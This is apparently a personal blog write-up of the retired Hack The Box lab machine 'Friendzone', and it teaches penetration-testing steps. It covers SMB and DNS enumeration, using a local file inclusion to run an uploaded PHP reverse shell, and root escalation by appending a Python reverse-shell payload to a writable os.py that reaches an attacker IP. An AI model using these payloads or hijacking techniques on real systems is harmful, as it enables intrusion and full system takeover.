---
layout: post
title: "HTB-Friendzone"
categories: HTB-Walkthrough
---


![friendzone](/assets/img/friendzone/friendzone1.png)


Friendzone is another OSCP-like box from the HTB 'retired' archive.

<h3>Nmap</h3>

`nmap -sV -Pn --min-rate 10000 -p- 10.10.10.123 |tee -a friend.txt`

![nmap](/assets/img/friendzone/friendzone-nmap.png)


We see that the target has a domain server running on port 53, so add friendzone.htb to the /etc/hosts file.

Run nmap again with the `-sC` flag set, it will run default enumeration scripts.

`nmap -sC 10.10.10.123`

```

PORT    STATE SERVICE                                                                                              
21/tcp  open  ftp                                                                                                  
22/tcp  open  ssh
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn
443/tcp open  https
|_http-title: FriendZone escape software
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp open  microsoft-ds

Host script results:
|_clock-skew: mean: -38m55s, deviation: 1h09m16s, median: 1m03s
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2020-03-05T23:20:15+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-03-05T21:20:15
|_  start_date: N/A

```

The information on port 443 also gives us friendzone.red to add to /etc/hosts.




<hr width="250" size="6">



<h3>Samba Enumeration</h3>



Enum4linux is an excellent tool for enumerating smb and samba servers. The scan takes a while, but returns some helpful information.

`enum4linux 10.10.10.123`

Some shares are found...

![enum4](/assets/img/friendzone/friendzone-enum4.png)


[Smbmap](https://github.com/ShawnDEvans/smbmap) can help quickly enumerate the available shares.

`smbmap -H 10.10.10.123 -R`

![smbmap](/assets/img/friendzone/friendzone-smbmap.png)


We can also retrieve the file with smbmap:

`smbmap -H 10.10.10.123 --download 'general\creds.txt'`

The contents are a set of admin credentials.

```
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```


<hr width="250" size="6">


I decided to start enumerating the web services, looking for some login page or prompt. 
Browsing to friendzone.htb drew a blank, but friendzone.red led me to an interesting page.

![red](/assets/img/friendzone/friendzone-red.png)


The page source, doesn't give us much info, so I try enumerating directories with gobuster.

```
gobuster dir -u http://friendzone.red/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x .php,.txt,.sh
```

I also add `friendzoneportal.red` to the /etc/hosts file, and decide to use dig to find any more
domains being hosted.

`dig axfr friendzone.red @10.10.10.123`

```

; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> axfr friendzone.red @10.10.10.123
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 91 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: Thu Mar 05 17:55:23 EST 2020
;; XFR size: 8 records (messages 1, bytes 289)


```


I add `administrator1.friendzone.red` `hr.friendzone.red` and `uploads.friendzone.red` to the /etc/hosts file.


The enumeration seemed to be full of dead ends.

At last the https service gave us something different to look at...

`https://friendzone.red`

![https](/assets/img/friendzone/friendzone-https.png)

And there was a hint in the page source.

![source-hint](/assets/img/friendzone/friendzone-source.png)


Taking a look, we find some base64 string to decode.

I notice that the string changes every time the page refreshes...in the source-code, we get a hint as to why.

```
<p>Testing some functions !</p><p>I'am trying not to break things !</p>SUdlSkp0NE1DYjE1ODM0NTIyNzAwSGpqRGhYSFNn<!-- dont stare too much , you will be smashed ! , it's all about times and zones ! -->
```


<hr width="250" size="6">

Next I take a look at `https://administrator1.friendzone.red`, its the login I've been 
looking for.

![login](/assets/img/friendzone/friendzone-login.png)

The login works, but the result is not quite what was expected.

![login-done](/assets/img/friendzone/friendzone-login-done.png)


We visit the page:

![dashboard](/assets/img/friendzone/friendzone-dashboard.png)


The page is telling the user to enter `image_id=a.jpg&pagename=timestamp` to see the image.

I do this and get:

![haha](/assets/img/friendzone/friendzone-haha.png)

It gives us a timestamp which we add, but still get Nelson laughing.


<h3>LFI</h3>



The page hints that the `pagename` parameter can be exploited to get an LFI (local file inclusion).

So it may be possible to get a quick reverse-shell by uploading a php-reverse-shell to a shared folder (via smbclient) and include it in the url request.

<hr width="250" size="6">


Looking back at the `smbmap` results, we can read and write to the `Development` share.

I get a copy of the php-reverse-shell from `/usr/share/webshells/php/`, rename it `evil.php`, and modify the listening ip and port as required.

Now I need to upload it. with `put evil.php`

```

smbclient //10.10.10.123/Development


Enter WORKGROUP\root's password:                                                                                   
Try "help" to get a list of possible commands.                                                                     
smb: \> ls                                                                                                         
  .                                   D        0  Thu Mar  5 16:49:58 2020                                         
  ..                                  D        0  Wed Jan 23 16:51:02 2019                                         
                                                                                                                   
                9221460 blocks of size 1024. 6338972 blocks available                                              
smb: \> pwd                                                                                                        
Current directory is \\10.10.10.123\Development\                                                                   
smb: \> ls                                                                                                         
  .                                   D        0  Thu Mar  5 16:49:58 2020                                         
  ..                                  D        0  Wed Jan 23 16:51:02 2019                                         
                                                                                                                   
                9221460 blocks of size 1024. 6338960 blocks available                                              
smb: \> put evil.php
putting file evil.php as \evil.php (9.9 kb/s) (average 9.9 kb/s)                                                   
smb: \> ls                                                                                                         
  .                                   D        0  Fri Mar  6 08:18:28 2020                                         
  ..                                  D        0  Wed Jan 23 16:51:02 2019                                         
  evil.php                            A     3461  Fri Mar  6 08:18:28 2020                                         
                                                                                                                   
                9221460 blocks of size 1024. 6338956 blocks available                                              
smb: \>                                                                       

```


It should be a simple case now of including the file, and catching the reverse shell.

After a few tries of failing to locate the Development folder, I find it in `/etc/` and the exploit works.

```
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/evil
```

The server adds `.php` to the included file, so we just need to omit that from the url request.


<h3>Privilege Escalation</h3>

To get a better shell I use the python command

`python -c 'import pty;pty.spawn("/bin/bash")'`

I start enumeration with the `sudo su` and `sudo -l` commands, but require a password.

Looking for suid files with `find / -perm -u=s -type f 2>/dev/null` doesn't reveal any unusual binaries that catch my eye.

I next check out the webserver folder in `/var/www/`

![varwww](/assets/img/friendzone/friendzone-varwww.png)

`mysql_data.conf` instantly draws my attention, and its contents are very helpful.

```

for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ

```

`ls /home` confirms that user `friend` has a home directory.
Switching to user friend is simple.

![friend](/assets/img/friendzone/friendzone-friend.png)

Now we can grab the user flag from `friend`'s home directory.

```
cat user.txt
a9xxxxxxxxxxxxxxxxxxxxxxxxxxx11
```



<hr width="250" size="6">


`ps aux` gives a list of running processes, but nothing stands out.

I've used [pspy](https://github.com/DominicBreuker/pspy) before and found it highly effective
for enumerating running processes, so I send it to the target and set it running.

I use a python command to serve the file: `python3 -m http.server 80`
I create a folder on the target to work from: `mkdir /var/tmp/boo`
From inside my new folder I download the binary with: `wget http://10.10.14.14/pspy32`
And make it executable with: `chmod +x pspy32`

![pspy](/assets/img/friendzone/friendzone-pspy32.png)

Running the program reveals that root is running a python script `/opt/server_admin/reporter.py`

Looking at `reporter.py` it seems harmless enough!

![reporterpy](/assets/img/friendzone/friendzone-reporterpy.png)


```
-rwxr--r-- 1 root root  424 Jan 16  2019 reporter.py
```

I can not write to the file, so can't edit it by replacing its contents or appending something. 


The script calls the `os` library, taking a look at that reveals something interesting.

![ospy](/assets/img/friendzone/friendzone-ospy.png)

The os.pyc (bytecode) is owned by 'friend', and the sourcecode (os.py) is owned by root, but readable,writable and executable by anybody.

If I replace os.py with an exploit, its likely that root will run it when it executes reporter.py.


<hr width="250" size="6">

First I copy os.py as os-old.py just incase something goes wrong and I need to restore it.

Next I copypaste this python reverse shell...and append it to os.py

```

import pty
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.14",443))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
s.close()

```

To do this I use `vi`

`vi os.py`

To goto end of file and edit; press `esc` then `GA` (in capitals)
This takes you to end of file and enters input mode...

`Ctrl + v` pastes the clipboard.

Press `esc` then `:wq` to save and exit.

set listener .....and wait...

```

 nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.123] 35100
root@FriendZone:~# cat /root/root.txt
cat /root/root.txt
b0xxxxxxxxxxxxxxxxxxxxxxxc7
root@FriendZone:~# 


```

I remove os.py and do `mv os-old.py os.py` to restore the scenario.


:)

